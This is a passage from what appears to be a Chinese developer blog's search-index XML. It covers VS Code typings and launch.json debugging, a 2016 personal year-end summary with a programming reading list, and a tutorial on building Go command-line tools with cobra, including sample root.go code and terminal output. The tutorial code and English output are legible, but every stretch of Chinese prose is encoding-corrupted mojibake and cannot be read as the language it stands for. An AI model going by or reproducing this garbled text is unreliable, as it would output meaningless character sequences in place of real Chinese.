Ëøô‰∫õÊñá‰ª∂Â∞±ÊòØ‰∏∫Êàë‰ª¨Êèê‰æõÊèêÁ§∫‰ø°ÊÅØÁöÑÁ±ªÂûãÁ±ªÂûãÊñá‰ª∂(‰ΩøÁî®TypeScriptÂÆö‰πâ)„ÄÇÊü•ÁúãTypingsÊòØÂê¶ÊîØÊåÅÊüê‰∏™Â∫ìÊàñÊ°ÜÊû∂ÁöÑÊô∫ËÉΩÊèêÁ§∫ÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®‰∏ãÈù¢ÁöÑÂëΩ‰ª§:1typings search exampleName ÂêØÂä®Êô∫ËÉΩÊèêÁ§∫ÈÖçÁΩÆÂ•Ω‰∫ÜÁ±ªÂûãÊé•Âè£ÂêéÔºåÂèØ‰ª•ÈÄöËøá‰∏§ÁßçÊñπÂºèÊù•ÂêØÂä®ÊèêÁ§∫ÂäüËÉΩÔºö Êñá‰ª∂Â§¥Âä†Ê≥®Èáä 1/// &lt;reference path="./typings/index.d.ts" /&gt; Âú®ÁõÆÂΩï(Âú®ËøôÈáåÊòØNodeSnippetÊñá‰ª∂Â§π‰∏≠)Â¢ûÂä†‰∏Ä‰∏™Âêç‰∏∫jsconfig.jsonÁöÑÁ©∫Êñá‰ª∂ Êõ¥Â§öjsconfig.jsonÊñá‰ª∂ÁöÑÂÜÖÂÆπÂèØ‰ª•ÂèÇËÄÉÔºö JavaScript in VS Code ËøôÊ†∑Êàë‰ª¨ÂÜô‰ª£Á†ÅÁöÑÊó∂ÂÄôÂ∞±ÊúâÊô∫ËÉΩÊèêÁ§∫ÂäüËÉΩ‰∫ÜÔºå ÊïàÊûúÂ¶Ç‰∏ã: Ë∞ÉËØïÂ¶Ç‰ΩïË∞ÉËØïÂÜôÂ•Ω‰∫ÜÁöÑJSÁ®ãÂ∫èÂñÉÔºü Áî®VS CodeÂø´ÈÄüÂàõÂª∫launch.jsonÊñá‰ª∂, ‰∏ªË¶ÅÊòØ‰øÆÊîπprogramËøô‰∏™ÂèÇÊï∞ÔºåÊåáÊòé‰Ω† ÂèØÊâßË°åÊñá‰ª∂‰ΩçÁΩÆ„ÄÇ ÂÖ≥‰∫éDebugÁöÑÁªÜËäÇÔºåËØ∑ÂèÇËÄÉDebugging 123456789101112131415161718192021&#123; // Use IntelliSense to learn about possible Node.js debug attributes. // Hover to view descriptions of existing attributes. // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 "version": "0.2.0", "configurations": [ &#123; "type": "node", "request": "launch", "name": "ÂêØÂä®Á®ãÂ∫è", "program": "$&#123;workspaceRoot&#125;/app.js", "cwd": "$&#123;workspaceRoot&#125;" &#125;, &#123; "type": "node", "request": "attach", "name": "ÈôÑÂä†Âà∞ËøõÁ®ã", "port": 5858 &#125; ]&#125; ÊïàÊûúÂ¶Ç‰∏ã:]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2016ÊÄªÁªì‰∏é2017ËÆ°Âàí]]></title>
    <url>%2F2016%2F12%2F31%2F2016-summary%2F</url>
    <content type="text"><![CDATA[Â≠îÂ≠êÊõ∞:‚ÄùÂêæÊó•‰∏âÁúÅÂêæË∫´‚Äù, Âπ≥Êó∂ÂæàÂ∞ë‰ºöÈùô‰∏ãÂøÉÊù•ÂèçÁúÅÂíåÊÄªÁªì‰∏ÄÊÆµÊó∂Èó¥ÁöÑÂäü‰∏éËøá, 2016È©¨‰∏äÂ∞±Ë¶ÅËøáÂéª‰∫ÜÔºåÂú®Ëøô‰∏ÄÂπ¥Â∞ÜË¶ÅÁªìÊùü‰πãÊó∂, ËøòÊòØÊÉ≥ÂõûËøá‰∏Ä‰∏ãËøô‰∏ÄÂπ¥Êù•ÁöÑÂæó‰∏éÂ§±, È°∫‰æøÂÆâÊéí‰∏ãÊù•Âπ¥ÁöÑËÆ°Âàí„ÄÇ ËÆ∞ÂΩï‰∏ãËøô‰∏ÄÂπ¥Êù•Ëá™Â∑±ÁöÑÂèòÂåñ, ÂêåÊó∂‰πü‰∏∫Êù•Âπ¥ÂÜçÊàò‰ΩúÂáÜÂ§á, ËÄå‰∏îÊàëËøô‰∫∫ËÆ∞ÊÄß‰∏çÂ•Ω, Áïô‰∏™Â∫ï,ÁÖß‰∫ÆËá™Â∑±ÈúÄË¶ÅËµ∞ÁöÑË∑Ø„ÄÇ ËΩ¨Áû¨Âç≥ÈÄùÁöÑ20162016ÊòØÁπÅÂøôÁöÑ‰∏ÄÂπ¥ÔºåÂ∑•‰Ωú‰∏äÂ§ÑÂ§ÑÂÖÖÊª°ÊåëÊàòÔºåÊúâ‰∫õÊåëÊàòÊòØËá™Â∑±ÂñúÊ¨¢ÁöÑÔºåÊúâ‰∫õÊåëÊàò‰πüÊòØËá™Â∑±ÊØîËæÉÊäµËß¶ÁöÑÔºåÊàëÂñúÊ¨¢ÂºÄÂèëÔºå‰ªéËøêÁª¥ÂºÄÂèëËΩ¨ËÄåÂèÇ‰∏éÂ§ßÂûãÁ≥ªÁªüÂºÄÂèëÔºåËøôÁöÑÁ°ÆÊòØ‰∏Ä‰∏™‰∏çÂ∞èÁöÑÊåëÊàòÔºåÊàëÊòØ‰∏Ä‰∏™ÂØπÊäÄÊúØÊúâÁÇπÊøÄÊÉÖÁöÑ‰∫∫ÔºåÂõ†Ê≠§Ëøô‰∏™ÊåëÊàòÂØπÊàëËÄåË®ÄËøòÊòØÊØîËæÉÂñúÊ¨¢ÁöÑ„ÄÇÂêéÊù•ÂêåÊó∂ÂÅöËµ∑‰∫Ü‰∫ßÂìÅËÆæËÆ°, ÊØèÂ§©Êâ£ËÑëË¢ã, ÁúãÂà´‰∫∫ÁöÑ‰∫ßÂìÅÔºåÁîª‰∫ßÂìÅËÆæËÆ°ÂõæÔºå Ëøô‰∫õÂú®ÂΩìÊó∂ÁöÑÊàëÊòØÂæàÊäµËß¶ÁöÑ, ÂΩìÊó∂ÊàëËøòÂ§Ñ‰∫éÂçïÁ∫ØÁöÑÊÉ≥ÁßØÁ¥ØÊäÄÊúØÁöÑÈò∂ÊÆµ„ÄÇÁé∞Âú®ÁúãÊù•ËøôÊÆµÁªèÂéÜ‰πüÊòØÊàëÂÆùË¥µÁöÑË¥¢ÂØå, ÊØïÁ´ü‰∫ßÂìÅÂÜ≥ÂÆö‰∏úË•øÁöÑ‰ª∑ÂÄºÔºåÁî®ÂÜçÁâõÂèâÁöÑÊäÄÊúØ,ÂÅö‰∏Ä‰∏™Ê≤°Êúâ‰ª∑ÂÄºÁöÑ‰∏úË•ø, ËøôÊòØ‰∏Ä‰ª∂ÊÑöË†¢ÁöÑË°å‰∏∫ÔºåÊàëËøôÈáåËØ¥ÁöÑ‰ª∑ÂÄºÊòØÈïøËøú‰ª∑ÂÄºÔºåËÄå‰∏çÊòØÂΩì‰∏ãÁúãËµ∑Êù•Êúâ‰ª∑ÂÄº, Ëøô‰∏™ËØ¥Ëµ∑Êù•ÂæàÊÇ¨Ôºå‰ª•ÂêéÊúâÊú∫‰ºöÊ∑±ÂÖ•ËÆ®ËÆ∫Ëøô‰∏™„ÄÇ 2016Ëøô‰∏ÄÂπ¥‰πüÂú®ÂíåJumpServer‰∏ÄÂêåÊàêÈïøÁöÑ‰∏ÄÂπ¥ÔºåÊÑüËß¶‰πüËõÆÂ§öÁöÑÔºåÈ¶ñÂÖàÊòØÊäÄÊúØÁöÑÊàêÈïøÔºå‰∏Ä‰∏™ÂºÄÊ∫ê‰∫ßÂìÅÁöÑÊäÄÊúØÁöÑËø≠‰ª£ÔºåÊàë‰ª¨Ëá¥Âäõ‰∫éËÆæËÆ°NBÁöÑ‰∫ßÂìÅÂíåÂÜôÂá∫ÊºÇ‰∫ÆÁöÑ‰ª£Á†Å„ÄÇÂÖ∂Ê¨°‰∏∫ÊúâÂèØËÉΩÁöÑËûçËµÑË∞àÂà§ËÄåÂÖ¥Â•ãËøáÔºåÁÑ∂ËÄåÊúÄÂêéËøòÊòØÂπ≥Èùô‰∏ãÊù•, ÊÖ¢ÊÖ¢ÂÅö‰∏Ä‰∏™Ëá™Â∑±ËÆ§ÂèØÁöÑËÉΩÂäõËåÉÂõ¥‰πãÂÜÖÁöÑ‰∫ßÂìÅ„ÄÇ Â∑•‰Ωú‰∏äÁöÑ‰∫ãÂÑø, ÊÄªÊòØÊúâÈÇ£‰πàÁÇπÁ¥ßÁª∑, ÂÖ∂ÂÆûÁîüÊ¥ª‰∏ä‰πüÊúâÂæàÂ§öÂÄºÂæóÈ´òÂÖ¥ÁöÑ‰∫ãÂÑøÔºåÊàë‰ª¨Êúâ‰∫ÜËá™Â∑±ÁöÑÊàøÂ≠êÔºåÂπ∂‰∏îÊê¨ËøõÂéª‰∫ÜÔºåÂëäÂà´‰∫ÜÁßüÊàøÁöÑÊó•Â≠êÔºåËøô‰∏ÄÂàáÂ§öË∞¢ÊàëÁöÑËÄÅÂ©ÜÊâìÁêÜÔºåÊàëÂü∫Êú¨ÊòØÂï•ÂøÉÈÉΩÊ≤°ÊìçËøá„ÄÇÂÖ∂Ê¨°ÔºåÊàëÂ•≥ÂÑøÂíåÊàëÂÖ≥Á≥ª‰πüÂæà‰∏çÈîôÔºåËôΩÁÑ∂Â•πÁîüÊ∞îÁöÑÊó∂ÂÄôÂè™ÊâæÂ•πÂ¶àÂ¶àÔºå‰ΩÜÊòØÊàëÂú®Â•πÂøÉ‰∏≠ÁöÑÂú∞‰Ωç‰πü‰ªÖÊ¨°‰∫éÂ•πÂ¶àÂ¶àÔºåÊàë‰πüÂøÉÊúâÊÑßÁñöÔºå‰Ωú‰∏∫‰∏Ä‰∏™Áà∂‰∫≤ÊàëÈô™‰º¥Â•πÁöÑÊó∂ÂÄôÊòØÊúâÁÇπÂ∞ë‰∫Ü„ÄÇËøòÊúâÊàëÁöÑÂ•ΩÊê≠Ê°£ÔºåÂú®ÊàëÊúÄÈúÄË¶ÅÈí±ÁöÑÊó∂ÂÄô, ‰∏ÄË∫´‰∏çÂê≠ÁöÑÁõ¥Êé•ËΩ¨ÊàëÊîØ‰ªòÂÆù‰∏ä,‰∫∫Áîü‰∏≠ËÉΩ‰∫§Âà∞‰∏Ä‰∏™ËøôÊ†∑ÁöÑÊúãÂèãÔºåÊòØÊàëÁöÑËé´Â§ßÁöÑËç£Âπ∏„ÄÇ ËøòÊúâ‰∏Ä‰∏™‰∫ãÂÑøÔºåÊàëÁªà‰∫éÁî®‰∏äMac‰∫ÜÔºåËôΩÁÑ∂ÊòØ‰∏Ä‰∏™‰∫åÊâãÁöÑMBPÔºå‰ΩÜÊòØËøôÂØπÊª°Ë∂≥‰∏Ä‰∏™Â±å‰∏ùÁöÑËôöËç£ÂøÉÂÆåÂÖ®ÂèóÁî®‰∫Ü, ËØ¥Â≤î‰∫Ü, ÊàëÂÜç‰πü‰∏çÁî®Âú®Windows‰∏äË£ÖUbuntuÂºÄÂèë‰∫Ü„ÄÇ Áû¨ÊÅØ‰∏áÂèòÁöÑ2017ÂèòÂåñÂíåÈù©Êñ∞ÊòØÂæàÂø´ÁöÑ, ÊØîÂ¶ÇOpenStackÊ≤°ÊúâÈÇ£‰πàÁÉ≠‰∫Ü, ÂÆπÂô®ÊäÄÊúØ‰πüÂü∫Êú¨Êàê‰∫ÜÂºÄÂèëÁöÑÂøÖÂ§áÊäÄËÉΩ, Êó†ËÆ∫‰Ω†‰Ωú‰∏∫‰∏Ä‰∏™ÂâçÁ´ØÂºÄÂèëËøòÊòØÂêéÁ´ØÂºÄÂèëJavaScriptÈÉΩÂø´Êàê‰∏∫‰∏ÄÈó®ÂøÖÂ§áËØ≠Ë®Ä‰∫Ü„ÄÇÂâçÂêéÁ´ØÁöÑÂÆåÂÖ®ÂàÜÁ¶ª‰πüÊÑàÊºîÊÑàÁÉà, ÂêÑÁßçÂâçÊÆµÊ°ÜÊû∂ÁöÑÂèòÂåñ„ÄÇ‰º¥ÈöèËÄåÊù•ÁöÑÊòØÂæÆÊúçÂä°+ÂÆπÂô®ÊäÄÊúØÁöÑÁ¥ßÂØÜÁªìÂêà„ÄÇÂú®ÊúÄÂêéDDD‰πüÈöèÁùÄÂæÆÊúçÂä°ÁöÑÂá∫Áé∞ÔºåÂØπÂºÄÂèë‰∫∫ÂëòÊèêÂá∫‰∫ÜÊõ¥È´òÁöÑÈúÄÊ±Ç, ‰ª•ÂêéÈÇ£ÁßçÂè™‰ºöÂÜô‰ª£Á†ÅÁöÑ‰∫∫Â∞ÜÊÑàÊù•ÊÑàÂ∞ë‰∫Ü„ÄÇ ÊàëHold‰∏ç‰ΩèËøô‰∫õÔºåÂõ†Ê≠§Âú®ÊäÄÊúØÊñπÈù¢Êàë‰ªÖËÉΩÂàóÂá∫ÊàëÈúÄË¶ÅÊèêÂçáÁöÑ‰π¶Âçï: PythonÊèêÂçá‰π¶Âçï(‰ªäÂπ¥‰∏ªÂäõ) Âü∫Á°ÄÂõûËøá ÂªñÈõ™Â≥∞ÂÆòÁΩë Think Python 2ed ‰∏≠ËØëÁâàÁ≤æÊ†° PDF ÁîµÂ≠ê‰π¶ ËøõÈò∂Ê∑± python3-cookbook ÁîµÂ≠ê‰π¶PythonÈ´òÊâã‰πãË∑Ø Â∏∏ËßÅÁöÑ‰∏Ä‰∫õ‰ª£Á†ÅÂÆûÁé∞ pythonÂÆû‰æãÊâãÂÜå ÁΩëÁ´ô‰∏äÁöÑÊñáÁ´† ËÆæËÆ°Ê®°Âºè Âø´ÈÄüÁâàÂ§ßËØùËÆæËÆ°Ê®°Âºè ‰∏Ä‰∫õÊúÄÊñ∞ÁöÑ‰æãÂ≠ê Á≤æÈÄöPythonËÆæËÆ°Ê®°Âºè Êï∞ÊçÆÁªìÊûÑ‰∏éÁÆóÊ≥ï Âø´ÈÄüÈòÖËØªÊÄªÁªì ÁîµÂ≠ê‰π¶ÔºöData Structures and Algorithms with Python-2015 Ê∫êÁ†ÅÈòÖËØª Django Class Based View Flask Ê∫êÁ†ÅÈòÖËØª Openstack KeyStone Ê∫êÁ†ÅÈòÖËØª ÁêÜËß£PythonËß£ÈáäÂô® Áî®PythonÂÆûÁé∞‰∏Ä‰∏™PythonËß£ÈáäÂô® GolangÊèêÂçá‰π¶Âçï ÂõûËøáÂü∫Á°ÄÔºö Go Web ÁºñÁ®ã GoÂÖ•Èó®ÊåáÂçó JavaScriptÊèêÂçá‰π¶Âçï ÂõûËøáÂü∫Á°ÄÔºö ÂªñÈõ™Â≥∞ÂÆòÁΩë ÈòÆ‰∏ÄÂ≥∞ÁöÑjavascriptÊïôÁ®ã ECMAScript 6 ÂÖ•Èó® Èô§‰∫ÜÊäÄÊúØ, ËøòÂ∫îËØ•ÊúâÁîüÊ¥ª„ÄÇËÄåÁîüÊ¥ªÂ∞±ÊòØ: Ëµ∂Á¥ßÊääË¥¶ËøòÂÆå]]></content>
      <categories>
        <category>ÊùÇË∞à</category>
        <category>Âπ¥ÁªàÊÄªÁªì</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Â¶Ç‰Ωï‰ΩøÁî®golangÁºñÂÜôÊºÇ‰∫ÆÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑]]></title>
    <url>%2F2016%2F12%2F30%2Fgo-cobra%2F</url>
    <content type="text"><![CDATA[Êó†ËÆ∫ÊòØOpenstackËøòÊòØDockerÈÉΩÊúâ‰∏Ä‰∏™ÊºÇ‰∫ÆÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑ÔºåOpenstackÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑‰∏ªË¶Å‰ΩøÁî®ÁöÑÊòØPythonÁöÑargparseÂ∫ìÔºåËá≥‰∫éDockerÁöÑCLIÁöÑÂÆûÁé∞ËøòÊ≤°ÁúãÔºå‰ΩÜÊòØ‰ªäÂ§©ÁúãÂà∞‰∫Ü‰∏Ä‰∏™Âú®Golang‰∏≠ Áî®‰∫éÊûÑÂª∫ÂÉèDockerÂëΩ‰ª§Ë°åÈ£éÊ†ºÁöÑ‰∏Ä‰∏™Â∫ì:cobra cobraÁÆÄ‰ªãCobraÊó¢ÊòØ‰∏Ä‰∏™Áî®Êù•ÂàõÂª∫Âº∫Â§ßÁöÑÁé∞‰ª£CLIÂëΩ‰ª§Ë°åÁöÑgolangÂ∫ìÔºå‰πüÊòØ‰∏Ä‰∏™ÁîüÊàêÁ®ãÂ∫èÂ∫îÁî®ÂíåÂëΩ‰ª§Ë°åÊñá‰ª∂ÁöÑÁ®ãÂ∫è„ÄÇÂÆÉÊèê‰æõÁöÑÂäüËÉΩÊúâÔºö ÁÆÄÊòìÁöÑÂ≠êÂëΩ‰ª§Ë°åÊ®°ÂºèÔºåÂ¶Ç app serverÔºå app fetchÁ≠âÁ≠â ÂÆåÂÖ®ÂÖºÂÆπposixÂëΩ‰ª§Ë°åÊ®°Âºè ÂµåÂ•óÂ≠êÂëΩ‰ª§subcommand ÊîØÊåÅÂÖ®Â±ÄÔºåÂ±ÄÈÉ®Ôºå‰∏≤ËÅîflags ‰ΩøÁî®CobraÂæàÂÆπÊòìÁöÑÁîüÊàêÂ∫îÁî®Á®ãÂ∫èÂíåÂëΩ‰ª§Ôºå‰ΩøÁî®cobra create appnameÂíåcobra add cmdname Â¶ÇÊûúÂëΩ‰ª§ËæìÂÖ•ÈîôËØØÔºåÂ∞ÜÊèê‰æõÊô∫ËÉΩÂª∫ËÆÆÔºåÂ¶Ç app srverÔºåÂ∞ÜÊèêÁ§∫srverÊ≤°ÊúâÔºåÊòØÂê¶ÊòØapp server Ëá™Âä®ÁîüÊàêcommandsÂíåflagsÁöÑÂ∏ÆÂä©‰ø°ÊÅØ Ëá™Âä®ÁîüÊàêËØ¶ÁªÜÁöÑhelp‰ø°ÊÅØÔºåÂ¶Çapp help Ëá™Âä®ËØÜÂà´-hÔºå‚ÄìhelpÂ∏ÆÂä©flag Ëá™Âä®ÁîüÊàêÂ∫îÁî®Á®ãÂ∫èÂú®bash‰∏ãÂëΩ‰ª§Ëá™Âä®ÂÆåÊàêÂäüËÉΩ Ëá™Âä®ÁîüÊàêÂ∫îÁî®Á®ãÂ∫èÁöÑmanÊâãÂÜå ÂëΩ‰ª§Ë°åÂà´Âêç Ëá™ÂÆö‰πâhelpÂíåusage‰ø°ÊÅØ ÂèØÈÄâÁöÑÁ¥ßÂØÜÈõÜÊàêÁöÑviper apps ‰ªéÂäüËÉΩ‰∏äÁúãÂÆåÂÖ®Ë∂ÖË∂ä‰∫ÜargparseÔºå ‰∏ãÈù¢Â∞ÜÂÅö‰∏Ä‰∏™ÁÆÄÂçïÁöÑÊµãËØïÔºå‰ΩìÈ™å‰∏ãcobraÁöÑÂº∫Â§ß ÂÆâË£ÖÂÆâË£ÖcobraÈúÄË¶ÅÁøªÂ¢ôÔºåÊàëÁöÑÁéØÂ¢ÉÊòØMacÔºå‰ΩøÁî®ss + polipoÊù•Êèê‰æõhttpsÁöÑÊñπÂêë‰ª£ÁêÜ„ÄÇÊàëÁöÑ‰ª£ÁêÜÁ´ØÂè£Âú®8123,ÊâÄ‰ª•ÂëΩ‰ª§Ë°åÊòØËøôÊ†∑ÁöÑ1$https_proxy=localhost:8123 go get -v github.com/spf13/cobra/cobra ÂÆâË£ÖÂÆåÊàêÂêéÂèØ‰ª•ÁúãÂà∞cobraÁöÑ‰∏Ä‰∫õÂ∏ÆÂä©‰ø°ÊÅØ1234567891011121314151617181920maojun@maojun-mbp$ cobra -hCobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: cobra [command]Available Commands: add Add a command to a Cobra Application init Initialize a Cobra ApplicationFlags: -a, --author string Author name for copyright attribution (default "YOUR NAME") --config string config file (default is $HOME/.cobra.yaml) -l, --license license Name of license for the project (can provide license in config) -b, --projectbase string base project directory, e.g. github.com/spf13/ --viper Use Viper for configuration (default true)Use "cobra [command] --help" for more information about a command. ‰ΩøÁî®Êé•‰∏ãÊù•Â∞Ü‰ΩøÁî®cobraÊûÑÂª∫‰∏Ä‰∏™‰∏çÂ∏¶Â≠êÂëΩ‰ª§ÁöÑCLIÂíåÂ∏¶Â≠êÂëΩ‰ª§ÁöÑCLI ÂàùÂßãÂåñÊàë‰ª¨ÂèØ‰ª•ÈÄöËøácobraÊèê‰æõÁöÑinitÂëΩ‰ª§Êù•ÁîüÊàêCLIÁöÑÊ°ÜÊû∂‰ª£Á†ÅÔºåÂõ†Ê≠§ÂàáÊç¢Âà∞GOPATH/src‰∏ãÈù¢,ÂàùÂßãCLIÊ°ÜÊû∂12345maojun@maojun-mbp$ cobra init demoYour Cobra application is ready at/Users/maojun/GoWorkDir/src/demoGive it a try by going there and running `go run main.go`Add commands to it by running `cobra add [cmdname]` Ëøô‰∏™ÂëΩ‰ª§‰ºöÂ∏Æ‰Ω†ÁîüÊàêËøôÊ†∑‰∏Ä‰∏™Ê°ÜÊû∂‰ª£Á†Å123456 maojun@maojun-mbp$ tree demodemo‚îú‚îÄ‚îÄ LICENSE‚îú‚îÄ‚îÄ cmd‚îÇ ‚îî‚îÄ‚îÄ root.go‚îî‚îÄ‚îÄ main.go ÁÆÄÂçïÁöÑCLIÂú®ÂÜô‰∏Ä‰∫õÁÆÄÂçïÁöÑCLIÁöÑÊó∂ÂÄôÊàë‰ª¨ÂÖ∂ÂÆûÊòØ‰∏çÈúÄË¶ÅÊúâÂ≠êÂëΩ‰ª§ÁöÑÔºåÊàë‰ª¨ÂæÄÂæÄÈúÄË¶ÅËøôÊ†∑‰∏ÄÁßçÁÆÄÂçïÁöÑCLI12345678910demo.exeDemo is a test appcation for print thingsUsage: demo [flags]Flags: -a, --age int person's age -h, --help help for demo -n, --name string person's name Êé•‰∏ãÊù•Êàë‰ª¨Â∞±Âú®‰∏äÈù¢ÁîüÊàêÁöÑ‰ª£Á†ÅÁöÑÂü∫Á°Ä‰∏äÂÆåÊàê‰∏Ä‰∏™‰∏çÂ∏¶Â≠êÂëΩ‰ª§ÁöÑCLI„ÄÇÈ¶ñÂÖàÔºåÊàëÈúÄË¶ÅÁºñÂÜôÊàëÁöÑ‰∏öÂä°ÈÄªËæëÔºåÂõ†Ê≠§ÊàëÂú®demo‰∏ãÈù¢Êñ∞Âª∫‰∏Ä‰∏™ÂåÖÔºåÂêçÁß∞‰∏∫simple„ÄÇÂ¶Ç‰∏ãÔºö123456789maojun@maojun-mbp$ tree ..‚îú‚îÄ‚îÄ LICENSE‚îú‚îÄ‚îÄ cmd‚îÇ ‚îî‚îÄ‚îÄ root.go‚îú‚îÄ‚îÄ main.go‚îî‚îÄ‚îÄ simple ‚îú‚îÄ‚îÄ simple.go ‚îî‚îÄ‚îÄ simple_test.go ËøôÈáå‰ªÖ‰ªÖÂÆûÁé∞‰∏Ä‰∏™print‰Ωú‰∏∫Ê†∑‰æã,Âõ†Ê≠§simple.goÊòØËøôÊ†∑ÂÆûÁé∞ÁöÑ123456789package simpleimport ( "fmt")func Show(name string, age int) &#123; fmt.Printf("My name is %s, my age is %d\n", name, age)&#125; Êé•‰∏ãÊù•Êàë‰ª¨ÈúÄË¶ÅÂ∞ÜÊàë‰ª¨ÂÆûË°åÁöÑÊï¥‰∏™ShowÊñπÊ≥ïÊö¥Èú≤ÁªôCLI, Êàë‰ª¨‰ªéÁîüÊàêÁöÑmainÊñá‰ª∂ÂÖ•ÊâãÂàÜÊûê„ÄÇ Âú®mainÈáåÈù¢Ë∞ÉÁî®‰∫Ü demo/cmdÂåÖÈáåÈù¢Êö¥Èú≤ÁöÑExecute ÂáΩÊï∞ [cmd.Execute()] Âú®demo/cmd/root.go‰∏≠ÂèëÁé∞ExecuteÊâßË°åÁöÑÊòØRootCmd.Execute() ËÄåRootCmdÊòØ‰∏Ä‰∏™cobraÁöÑCommandÁªìÊûÑ‰Ωì[RootCmd = &amp;cobra.Command]ÊòæÁÑ∂Êàë‰ª¨ÊÉ≥Ë¶ÅÂÆûË°å‰∏çÂ∏¶Â≠êÂëΩ‰ª§ÁöÑCLIÔºåÂè™ÈúÄË¶ÅÂ∞ÜRootCmdÁöÑ‰øÆÊîπÊàêÊàë‰ª¨ÈúÄË¶ÅÁöÑÁªìÊûÑ‰ΩìÂ∞±ok‰∫Ü ËøôÈáåÂÅö‰∫ÜÂá†ÁÇπ‰øÆÊîπ RootCmd‰∏≠ÁöÑCommandÁªìÊûÑ‰Ωì‰∏≠ÁöÑRunÊñπÊ≥ïÈúÄË¶ÅÊàë‰ª¨ÂÆö‰πâÔºå ‰∏ªË¶ÅÂäüËÉΩÂ∞±ÊòØË∞ÉÁî®simpleÈáåÈù¢ÁöÑShowÊé•Âè£ cmdÂåÖÂàùÂßãÂåñÂæóÊó∂ÂÄôÈúÄË¶ÅÈÄöËøáRootCmd.Flags()Ëé∑ÂèñÂëΩ‰ª§Ë°å‰º†ÂÖ•ÁöÑnameÂíåageÁöÑÂèÇÊï∞ÔºåÂõ†Ê≠§ËøôÈáåÈúÄË¶Å‰øÆÊîπinitÊñπÊ≥ï ÊúÄÂêéÊàë‰ª¨‰∏çÈúÄË¶Å‰ªéÈÖçÁΩÆÊñá‰ª∂ËØªÂèñÈÖçÁΩÆÔºåÊ≥®ÈáäÊéâÔºönitConfigÂáΩÊï∞Âíå‚Äùgithub.com/spf13/viper‚Äù ÊúÄÁªàËøô‰∏™root.goÊòØËøôÊ†∑ÁöÑ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687// Copyright ¬© 2016 NAME HERE &lt;EMAIL ADDRESS&gt;//// Licensed under the Apache License, Version 2.0 (the "License");// you may not use this file except in compliance with the License.// You may obtain a copy of the License at//// http://www.apache.org/licenses/LICENSE-2.0//// Unless required by applicable law or agreed to in writing, software// distributed under the License is distributed on an "AS IS" BASIS,// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.// See the License for the specific language governing permissions and// limitations under the License.package cmdimport ( "fmt" "os" "demo/simple" "github.com/spf13/cobra" // "github.com/spf13/viper")//var cfgFile stringvar name stringvar age int// RootCmd represents the base command when called without any subcommandsvar RootCmd = &amp;cobra.Command&#123; Use: "demo", Short: "A test demo", Long: `Demo is a test appcation for print things`,// Uncomment the following line if your bare application// has an action associated with it: Run: func(cmd *cobra.Command, args []string) &#123; if len(name) == 0 &#123; cmd.Help() return &#125; simple.Show(name, age) &#125;,&#125;// Execute adds all child commands to the root command sets flags appropriately.// This is called by main.main(). It only needs to happen once to the rootCmd.func Execute() &#123; if err := RootCmd.Execute(); err != nil &#123; fmt.Println(err) os.Exit(-1) &#125;&#125;func init() &#123; // cobra.OnInitialize(initConfig) // Here you will define your flags and configuration settings. // Cobra supports Persistent Flags, which, if defined here, // will be global for your application. // RootCmd.PersistentFlags().StringVar(&amp;cfgFile, "config", "", "config file (default is $HOME/.demo.yaml)") // Cobra also supports local flags, which will only run // when this action is called directly. // RootCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle") RootCmd.Flags().StringVarP(&amp;name, "name", "n", "", "persion's name") RootCmd.Flags().IntVarP(&amp;age, "age", "a", 0, "person's age")&#125;// // initConfig reads in config file and ENV variables if set.// func initConfig() &#123;// if cfgFile != "" &#123; // enable ability to specify config file via flag// viper.SetConfigFile(cfgFile)// &#125;// viper.SetConfigName(".demo") // name of config file (without extension)// viper.AddConfigPath("$HOME") // adding home directory as first search path// viper.AutomaticEnv() // read in environment variables that match// // If a config file is found, read it in.// if err := viper.ReadInConfig(); err == nil &#123;// fmt.Println("Using config file:", viper.ConfigFileUsed())// &#125;// &#125; ÊúÄÂêéÊµãËØï‰∏ãÊòØ‰∏çÊòØÊàë‰ª¨ÊÉ≥Ë¶ÅÁöÑÊïàÊûú1234567891011maojun@maojun-mbp$ go run main.go -hDemo is a test appcation for print thingsUsage: demo [flags]Flags: -a, --age int person's age -n, --name string persion's namemaojun@maojun-mbp$ go run main.go -n "test" -a 10My name is test, my age is 10 Â∏¶Â≠êÂëΩ‰ª§ÁöÑCLIÂØπ‰∫éÂ§çÊùÇÁöÑÊÉÖÂÜµÔºåÂæÄÂæÄÈúÄË¶ÅÂ∏¶Â≠êÂëΩ‰ª§Âú∫ÊôØÔºåÊØîÂ¶ÇDockerÁöÑCLIÔºåËÄåÊúÄÁªàÁöÑÊïàÊûúÂ∫îËØ•ÊòØËøôÊ†∑ÁöÑ12345678910111213141516demoDemo is a test appcation for print thingsUsage: demo [flags] demo [command]Available Commands: test A brief description of your commandFlags: -a, --age int person's age -h, --help help for demo -n, --name string person's nameUse "demo [command] --help" for more information about a command. ÊîØÊåÅÂ≠êÂëΩ‰ª§ÊòØcobraÁöÑËá™Â∑±ÁöÑÂäüËÉΩÔºåÂõ†Ê≠§Áõ¥Êé•ÂèØ‰ª•ÈÄöËøácobraÁîüÊàêÂ∏¶Â≠êÂëΩ‰ª§ÁöÑ‰ª£Á†Å12345678maojun@maojun-mbp$ cobra init demoYour Cobra application is ready at/Users/maojun/GoWorkDir/src/demoGive it a try by going there and running `go run main.go`Add commands to it by running `cobra add [cmdname]`maojun@maojun-mbp$ cobra add testtest created at /Users/maojun/GoWorkDir/src/cmd/test.go Ê≥®ÈáäÊéâroot.goÈÇ£‰∫õ‰∏çÈúÄË¶ÅÁöÑÂú∞Êñπ, ÁÑ∂Âêé‰øÆÊîπÁîüÊàêÁöÑtest.go12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// Copyright ¬© 2016 NAME HERE &lt;EMAIL ADDRESS&gt;//// Licensed under the Apache License, Version 2.0 (the "License");// you may not use this file except in 